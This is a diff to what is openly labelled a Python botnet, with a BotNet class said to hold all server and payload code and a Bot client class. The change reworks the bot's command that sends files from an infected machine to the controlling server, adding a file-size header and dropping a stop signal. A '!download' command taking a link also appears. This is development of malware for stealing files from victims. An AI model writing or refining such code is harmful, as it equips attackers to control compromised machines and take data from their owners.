@@ -1,5 +1,4 @@
 import socket, threading, hashlib, os, datetime, time, sqlite3, shutil, urllib.request, json, sys
-from typing import ByteString
 
 class BotNet:
     """Main Class for the BotNet. Every single line of server code, payload code is inside of this class.
@@ -4525,12 +4524,12 @@ class Bot:
                     try:
                         file = self.get_filename(msg)
                         file = open(file, "rb")
+                        length = len(open(file.name,"rb").read())
+                        self.client.send(f"!filesize {length}".encode())
                         self.sendingfile = True
                         while True:
                             sendto = file.read(10240)
                             if not sendto:
-                                time.sleep(3)
-                                self.client.send("!stopsave".encode())
                                 self.sendingfile = False
                                 break
                             else:
@@ -4538,9 +4537,10 @@ class Bot:
                         time.sleep(1)
                         self.client.send("File transfer to server completed.".encode())
                     except:
+                        length = 0
+                        self.client.send(f"!filesize {length}".encode())
+                        time.sleep(1)
                         self.client.send("File was not found in the bot directory.".encode())
-                        time.sleep(3)
-                        self.client.send("!stopsave".encode())
                 elif msg.startswith("!download"):
                     try:
                         link = msg.split()[1]
